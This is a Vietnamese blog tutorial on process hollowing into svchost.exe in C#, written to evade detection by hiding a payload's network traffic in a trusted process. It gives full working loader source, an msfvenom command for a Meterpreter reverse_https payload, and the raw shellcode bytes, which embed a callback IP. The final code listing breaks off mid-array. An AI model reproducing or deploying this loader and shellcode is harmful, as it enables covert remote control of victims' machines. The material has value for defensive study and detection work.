[![process-injection-techniques-blogs-runpe.gif](https://0xbadcode.ml/uploads/images/gallery/2022-04/process-injection-techniques-blogs-runpe.gif)](https://0xbadcode.ml/uploads/images/gallery/2022-04/process-injection-techniques-blogs-runpe.gif)

Thông thường, khi thực hiện kỹ thuật Process Injection chúng ta sẽ cố gắng chèn payload của mình vào các process như  `explorer.exe` hay `notepad.exe`.Mặc dù có thể lẩn trốn hiệu quả trong các process kiểu này nhưng chúng ta sẽ gặp vấn đề khi  tạo ra các "kết nối mạng" mà thông thường 2 ứng dụng này không bao giờ có hành vi như thế. 

Nội dung này sẽ hướng tới mục tiêu mới `svchost.exe` - một process thường tạo ra các hoạt động mạng để tránh sự nghi ngờ. Tuy nhiên đây lại là một process rất đặc biệt, nó luôn được chạy ở chế độ toàn vẹn `SYSTEM Integrity Level`. Nếu chúng ta khởi chạy `svhost.exe` và cố gắng injection theo cách thông thường , process sẽ ngay lập tức chấm dứt.

Để giải quyết vấn đề này, chúng ta sẽ khởi chạy chương trình `svchost.exe` và sửa đổi nó trước khi nó thực sự bắt đầu thực thi. Điều này được gọi là `Process Hollowing`


### 1. Tổng quan Process Hollowing 

Điểm qua quy trình tạo một Process thông qua API `CreateProcess` ta có :

* Tạo Memory Space cho Process mới
* Phân bổ stack cùng với "Thread Environment Block" và "Process Environment Block"
* Loads DLL hoặc EXE vào bộ nhớ 

Khi nhiệm vụ này được hoàn thành, hệ điều hành sẽ tạo ra một thread để thực thi code. Thread này sẽ bắt đầu tại EntryPoint của tệp thực thi (EXE). Nếu chúng ta cung cấp flag **CREATE_SUSPENDED** , quá trình thực thi của thread sẽ bị tạm dừng ngay trước khi nó chạy lệnh đầu tiên của EXE.

Tại thời điểm này, chúng ta sẽ định vị EntryPoint của file thực thi và ghi đè nội dung trong bộ nhớ của nó bằng shellcode 
rồi để cho nó tiếp tục thực thi

Định vị EntryPoint của file thực thi hơi phức tạp do nó được bảo vệ bởi [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization). Nhưng khi process suspend được tạo. Chúng ta có thể sử dụng  **ZwQueryInformationProcess** để truy xuất thông tin về target process bao gồm cả PEB (Process Environment Block) của nó. Từ PEB ta có thể lấy được `base address` của process, rồi từ đó phân tích PE header và định vị được EntryPoint

Luồng  **CreateProcess** --> **ZwQueryInformationProcess** --> **ReadProcessMemory** --> **WriteProcessMemory** --> **ResumeThread**

-----------------
Quá trình sẽ diễn ra như sau..

Bước 1 : Dùng **CreateProcess** làm `svchost.exe` bị suspend

Bước 2 : Dùng **ZwQueryInformationProcess** để đọc các thông tin về process và PEB

[![ph_4.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/ph_4.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/ph_4.png)

Bước 3. Dùng **ReadProcessMemory** để phân tích, dựa vào PEB và PE Header để tìm ra EntryPoint

Bước 4. Dùng **ResumeThread** để khởi chạy lại chương trình



### 2 Process Hollowing in C#

Trăm nghe không bằng một thấy, trăm thấy không bằng một thử...  Let'ss Gâu  !!!

[![hollowing1-1_.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/hollowing1-1_.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/hollowing1-1_.png)

##### Bước 1: Tạo ra một Process bị "treo".

Chúng ta phải sử dụng API CreateProcessW 

(Vì Process.Start và các process tương tự không cho phép chúng ta tạo ra một tiến trình bị suspend)

Import CreateProcessW  API

```
[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, 
    IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, 
        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, 
[In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
```


> Để import API này , chúng ta phải include System.Threading

Bây giờ chúng ta kiểm tra cách dùng với API này. Ta thấy các thông số sau  (C++)

```
BOOL CreateProcessW(
  [in, optional]      LPCWSTR               lpApplicationName,
  [in, out, optional] LPWSTR                lpCommandLine,
  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
  [in]                BOOL                  bInheritHandles,
  [in]                DWORD                 dwCreationFlags,
  [in, optional]      LPVOID                lpEnvironment,
  [in, optional]      LPCWSTR               lpCurrentDirectory,
  [in]                LPSTARTUPINFOW        lpStartupInfo,
  [out]               LPPROCESS_INFORMATION lpProcessInformation
);
```

* Một số tham số này không có trong C#, nên sau này chúng ta sẽ phải xác định một cách thủ công

`CreateProcessW` yêu cầu tới 10 tham số tuy nhiên chúng ta không cần dùng hết. Chỉ cần một vài cái trong số đó là đủ

* lpApplicationName : Tên của application sắp được thực thi (thông thường chúng ta để là NULL)
* lpCommandLine : Đường dẫn đầy đủ sẽ được thực thi ( **svchost.exe**
* lpProcessAttributes  : Chúng ta có thể mô tả security descriptor , nhưng nếu chúng ta set bằng NULL, security descriptor sẽ là mặc định
* lpThreadAttributes : Tính kế thừa của Process mới, đặt thành `false`

* dwCreationFlags : được sử dụng để chỉ ra ý định khi khởi chạy quy trình mới ở trạng thái suspended. `CREATE_SUSPENDED ` tương đương với giá trị `0x00000004`

[![ldDScreenshot_4.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/ldDScreenshot_4.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/ldDScreenshot_4.png)

* lpEnvironment : Chỉ định cài đặt biến môi trường sẽ được sử dụng (đặt thành NULL)
* lpCurrentDirectory : Folder hiện tại cho application mới (đặt thành null)

Tiếp theo, chúng ta sẽ truyền một structure STARTUPINFO, cấu trúc này có thể chứa một số giá trị liên quan đến cách cấu hình của Windows với một process mới

Chúng ta có thể tìm nó tại đây

https://www.pinvoke.net/default.aspx/Structures/StartupInfo.html?diff=y 
```
[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
struct STARTUPINFO
{
     public Int32 cb;
     public string lpReserved;
     public string lpDesktop;
     public string lpTitle;
     public Int32 dwX;
     public Int32 dwY;
     public Int32 dwXSize;
     public Int32 dwYSize;
     public Int32 dwXCountChars;
     public Int32 dwYCountChars;
     public Int32 dwFillAttribute;
     public Int32 dwFlags;
     public Int16 wShowWindow;
     public Int16 cbReserved2;
     public IntPtr lpReserved2;
     public IntPtr hStdInput;
     public IntPtr hStdOutput;
     public IntPtr hStdError;
}

```

Tham số cuối cùng là **PROCESS_INFORMATION** được tạo ra bởi CreateProcessW với thông tin về identification information (Proces ID , handle Process) . Chúng ta có thể tìm thấy nó tại đây 

https://www.pinvoke.net/default.aspx/rapi/CeCreateProcess.html

```
[StructLayout(LayoutKind.Sequential)]
public struct PROCESS_INFORMATION
{
   public IntPtr hProcess;
   public IntPtr hThread;    
   public int dwProcessID;    
   public int dwThreadID;    
}

```
Với tất cả các tham số đã biết về các struct được xác định, chúng ta có thể sử dụng bằng cách khởi tạo một STARTUPINFO  và một PROCESS_INFORMATION  sau đó cung cấp chúng cho CreateProcessW 

Code như sau

```
STARTUPINFO si = new STARTUPINFO();
PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, 
    IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
```

Đoạn code đến đây sẽ là 

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
namespace ConsoleApp5
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessID;
            public int dwThreadID;
        }
        
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
    IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
[In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        static void Main(string[] args)
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero,
                IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
                
                // Code tiep theo o day
        }
    }
}

```

##### Bước 2: Đọc `PEB` thông qua `ZwQueryInformationProcess`

Tra cứu về API này ta có code

```
[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
     private static extern int ZwQueryInformationProcess(IntPtr hProcess,
    int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,
    uint ProcInfoLen, ref uint retlen);
```

API `ZwQueryInformationProcess` có nhiều cách sử dụng, mặc dù hầu như không được ghi lại chính thức chúng ta cùng xem qua function sau 

```
NTSTATUS WINAPI ZwQueryInformationProcess(
  _In_      HANDLE           ProcessHandle,
  _In_      PROCESSINFOCLASS ProcessInformationClass,
  _Out_     PVOID            ProcessInformation,
  _In_      ULONG            ProcessInformationLength,
  _Out_opt_ PULONG           ReturnLength
);
```

*  Tiền tố `zw` trong `ZwQueryInformationProcess` cho biết rằng API có thể được gọi với chế độ người dùng. 
* return value được đưa ra là `NTSTATUS`.`ZwQueryInformationProcess` là một API cấp thấp nằm trong ntdll.dll và trả về giá trị thập lục phân

Ở đây chúng ta xét thấy các tham số tương đối đơn giản

* `ProcessHandle` là một process xử lý mà ta có thể lấy được từ  `PROCESS_INFORMATION ` structure
* `ProcessInformationClass` : tham số này chỉ được ghi lại một phần . Trong trường hợp này chúng ta đặt là 0

* Tham số thứ 3 `ProcessInformation ` phải là PROCESS_BASIC_INFORMATION  structure

Tìm kiếm trên Pivoke ra có cấu trúc sau

```
[StructLayout(LayoutKind.Sequential)]
internal struct PROCESS_BASIC_INFORMATION
{
    public IntPtr Reserved1;
    public IntPtr PebAddress;
    public IntPtr Reserved2;
    public IntPtr Reserved3;
    public IntPtr UniquePid;
    public IntPtr MoreReserved;
}
```

Hai tham số còn lại (ProcessInformationLength & ReturnLength ) cho biết kích thước của input structure và biến để giữ kích thước của dữ liệu đã nạp

Bây giờ chúng ta đã có thể gọi `ZwQueryInformationProcess ` và tìm địa chỉ của PEB từ cấu trúc `PROCESS_BASIC_INFORMATION` của `ProcessInformation`

```
PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
uint tmp = 0;
IntPtr hProcess = pi.hProcess;
ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
```

> **ptrToImageBase**  chứa một con trỏ đến image base  của `svchost.exe`trong process suspended . Đây là giá trị cuối cùng chúng ta cần có ở bước này

##### Bước 3 . Sử dụng `ReadProcessMemory`

Chúng ta sử dụng `ReadProcessMemory` để đọc địa chỉ của Code Base thông qua 8 bye bộ nhớ

Import DLL API

```
[DllImport("kernel32.dll", SetLastError = true)]
static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, 
    [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead)
```

`ReadProcessMemory` có cú pháp như sau

```
BOOL ReadProcessMemory(
  HANDLE  hProcess,
  LPCVOID lpBaseAddress,
  LPVOID  lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesRead
);
```

Ở đây, chúng ta phải cung cấp 5 tham số cho chức năng này. Bao gồm lần lượt: `Process handle` , `lpBaseAddressL: Địa chỉ bắt đầu đọc` , `lpBuffer: Buffer để sao chép nội dung`, `nSize: Số byte để đọc`, `lpNumberOfBytesRead: biến để chứa số bye thực sự được đọc`

Sau khi import DLL, chúng ta có thể gọi ReadProcessMemory bằng cách chỉ định bufer 8 byte, sau đó chuyển đổi sang số nguyên thông qua **BitConverter.ToInt64** method

```
byte[] addrBuf = new byte[IntPtr.Size];
IntPtr nRead = IntPtr.Zero;
ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
```
Sau đó chúng ta tiến hành phân tích PE Header để tìm EntryPoint . Đây là bước khó hiểu nhất ở nội dung  này

Sử dụng ReadProcessMemory để fetch PE header

```
byte[] data = new byte[0x200];
ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
```
Sau khi load PE header, chúng ta cần đọc content ở offsec 0x3c và added thêm 0x28  để ra Entrypoint (RVA) 

[![vt1Screenshot_2.png](https://0xbadcode.ml/uploads/images/gallery/2022-04/scaled-1680-/vt1Screenshot_2.png)](https://0xbadcode.ml/uploads/images/gallery/2022-04/vt1Screenshot_2.png)


Để tính toán điều này, trước tiên chúng ta chuyển đổi 4 byte tại `e_lfanew`  sau đó cộng thêm 0x28 để tạo thành một số nguyên.

Giá trị này là giá trị từ  `image base` của svchost.exe tới EntryPoint hay còn được gọi là RVA (). Sau đó chúng ta phải cộng thêm nó vào svhostBase để ra EntryPoint

Code như sau : 

```
uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
uint opthdr = e_lfanew_offset + 0x28;
uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
```

##### Bước 4 . Sử dụng WriteProcessMemory

Sau khi lấy được địa chỉ của EntryPoint, chúng ta có thể tạo shellcode Meterpreter của mình và sử dụng **WriteProcessMemory** để ghi đè vào Entrypoint file thực thi
```
byte[] buf = new byte[659] {
0xfc,0x48,0x83,0xe4,0xf0,0xe8...

WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
```
##### Bước 5. ResumeThread

Resume lại thương trình với ResumeThread

```
DWORD ResumeThread(
  HANDLE hThread
);
```

Tạo Shellcode với msfvenom
```
sudo msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.1.1 lport=443 -f csharp 
```

```
0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x51,0x48,0x8b,0x52,0x18,0x56,0x48,
0x8b,0x52,0x20,0x4d,0x31,0xc9,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0xe2,0xed,0x52,0x48,0x8b,0x52,0x20,0x41,0x51,0x8b,0x42,0x3c,0x48,
0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x44,0x8b,
0x40,0x20,0x50,0x49,0x01,0xd0,0x8b,0x48,0x18,0xe3,0x56,0x48,0xff,0xc9,0x4d,
0x31,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,
0x0d,0xac,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,
0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x41,0x58,
0x48,0x01,0xd0,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,
0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,
0x07,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,
0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,
0xe8,0x0e,0x00,0x00,0x00,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x34,0x39,
0x2e,0x38,0x35,0x00,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbb,0x01,0x00,0x00,
0x4d,0x31,0xc9,0x53,0x53,0x6a,0x03,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x00,
0x00,0x00,0x00,0xff,0xd5,0xe8,0x91,0x00,0x00,0x00,0x2f,0x5a,0x77,0x5f,0x61,
0x66,0x62,0x77,0x61,0x4c,0x30,0x35,0x2d,0x49,0x33,0x38,0x68,0x48,0x48,0x4d,
0x43,0x74,0x41,0x75,0x55,0x46,0x4a,0x36,0x71,0x6a,0x53,0x58,0x68,0x52,0x31,
0x62,0x79,0x56,0x39,0x72,0x59,0x48,0x55,0x50,0x77,0x51,0x39,0x30,0x4a,0x71,
0x52,0x32,0x5f,0x57,0x47,0x54,0x69,0x4f,0x61,0x36,0x44,0x67,0x55,0x6c,0x79,
0x5a,0x6a,0x36,0x75,0x51,0x47,0x35,0x62,0x4e,0x53,0x59,0x41,0x4d,0x6a,0x78,
0x41,0x30,0x78,0x58,0x50,0x74,0x37,0x52,0x4e,0x71,0x49,0x6f,0x6b,0x51,0x7a,
0x32,0x30,0x47,0x78,0x43,0x54,0x74,0x76,0x76,0x67,0x2d,0x6a,0x52,0x6b,0x6e,
0x78,0x63,0x55,0x49,0x66,0x69,0x57,0x42,0x68,0x71,0x72,0x4d,0x73,0x39,0x49,
0x34,0x6e,0x72,0x53,0x7a,0x43,0x56,0x77,0x6a,0x45,0x31,0x38,0x4c,0x35,0x42,
0x78,0x70,0x66,0x38,0x00,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,
0x53,0x48,0xb8,0x00,0x32,0xa8,0x84,0x00,0x00,0x00,0x00,0x50,0x53,0x53,0x49,
0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0x0a,0x5f,0x48,
0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,0x00,0x00,0x49,0x89,0xe0,0x6a,
0x04,0x41,0x59,0x49,0xba,0x75,0x46,0x9e,0x86,0x00,0x00,0x00,0x00,0xff,0xd5,
0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,
0x53,0x49,0xc7,0xc2,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,
0xc7,0xc1,0x88,0x13,0x00,0x00,0x49,0xba,0x44,0xf0,0x35,0xe0,0x00,0x00,0x00,
0x00,0xff,0xd5,0x48,0xff,0xcf,0x74,0x02,0xeb,0xaa,0xe8,0x55,0x00,0x00,0x00,
0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x00,
0x10,0x00,0x00,0x49,0xba,0x58,0xa4,0x53,0xe5,0x00,0x00,0x00,0x00,0xff,0xd5,
0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,
0xc0,0x00,0x20,0x00,0x00,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x00,
0x00,0x00,0x00,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,
0x07,0x48,0x01,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,
0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };
```


Code thành phẩm 

> Lưu ý khi biên dịch, nhớ xử dụng x64  thay vì x32 (vì svchost.exe là một process 64 bit)
> 
```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Text;
using System.Threading.Tasks;

namespace hollow
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess(
          string lpApplicationName,
          string lpCommandLine,
          IntPtr lpProcessAttributes,
          IntPtr lpThreadAttributes,
          bool bInheritHandles,
          uint dwCreationFlags,
          IntPtr lpEnvironment,
          string lpCurrentDirectory,
          [In] ref STARTUPINFO lpStartupInfo,
          out PROCESS_INFORMATION lpProcessInformation);

        private struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus;
            public IntPtr PebBaseAddress;
            public UIntPtr AffinityMask;
            public int BasePriority;
            public UIntPtr UniqueProcessId;
            public UIntPtr InheritedFromUniqueProcessId;
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern UInt32 ZwQueryInformationProcess(
        IntPtr hProcess,
        int procInformationClass,
        ref PROCESS_BASIC_INFORMATION procInformation,
        UInt32 ProcInfoLen,
        ref UInt32 retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(
           IntPtr hProcess,
           IntPtr lpBaseAddress,
           byte[] lpBuffer,
           Int32 nSize,
           out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        static void Main(string[] args)
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebBaseAddress + 0x10);
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            // Parse PE Header
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3c);
            uint opthdr = e_lfanew_offset + 0x28;

            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            // Overwrite Entry Point
            byte[] buf = new byte[698] {
0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x51,0x48,0x8b,0x52,0x18,0x56,0x48,
0x8b,0x52,0x20,0x4d,0x31,0xc9,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0xe2,0xed,0x52,0x48,0x8b,0x52,0x20,0x41,0x51,0x8b,0x42,0x3c,0x48,
0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x44,0x8b,
0x40,0x20,0x50,0x49,0x01,0xd0,0x8b,0x48,0x18,0xe3,0x56,0x48,0xff,0xc9,0x4d,
0x31,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,
0x0d,0xac,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,
0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x41,0x58,
0x48,0x01,0xd0,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,
0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,
0x07,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,
0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,
0xe8,0x0e,0x00,0x00,0x00,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x34,0x39,
0x2e,0x38,0x35,0x00,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbb,0x01,0x00,0x00,
0x4d,0x31,0xc9,0x53,0x53,0x6a,0x03,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x00,
0x00,0x00,0x00,0xff,0xd5,0xe8,0x91,0x00,0x00,0x00,0x2f,0x5a,0x77,0x5f,0x61,
0x66,0x62,0x77,0x61,0x4c,0x30,0x35,0x2d,0x49,0x33,0x38,0x68,0x48,0x48,0x4d,
0x43,0x74,0x41,0x75,0x55,0x46,0x4a,0x36,0x71,0x6a,0x53,0x58,0x68,0x52,0x31,
0x62,0x79,0x56,0x39,0x72,0x59,0x48,0x55,0x50,0x77,0x51,0x39,0x30,0x4a,0x71,
0x52,0x32,0x5f,0x57,0x47,0x54,0x69,0x4f,0x61,0x36,0x44,0x67,0x55,0x6c,0x79,
0x5a,0x6a,0x36,0x75,0x51,0x47,0x35,0x62,0x4e,0x53,0x59,0x41,0x4d,0x6a,0x78,
0x41,0x30,0x78,0x58,0x50,0x74,0x37,0x52,0x4e,0x71,0x49,0x6f,0x6b,0x51,0x7a,
0x32,0x30,0x47,0x78,0x43,0x54,0x74,0x76,0x76,0x67,0x2d,0x6a,0x52,0x6b,0x6e,
0x78,0x63,0x55,0x49,0x66,0x69,0x57,0x42,0x68,0x71,0x72,0x4d,0x73,0x39,0x49,
0x34,0x6e,0x72,0x53,0x7a,0x43,0x56,0x77,0x6a,0x45,0x31,0x38,0x4c,0x35,0x42,
0x78,0x70,0x66,0x38,0x00,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,
0x53,0x48,0xb8,0x00,0x32,0xa8,0x84,0x00,0x00,0x00,0x00,0x50,0x53,0x53,0x49,
0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0x0a,0x5f,0x48,
0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,0x00,0x00,0x49,0x89,0xe0,0x6a,
0x04,0x41,0x59,0x49,0xba,0x75,0x46,0x9e,0x86,0x00,0x00,0x00,0x00,0xff,0xd5,
0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,
0x53,0x49,0xc7,0xc2,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,
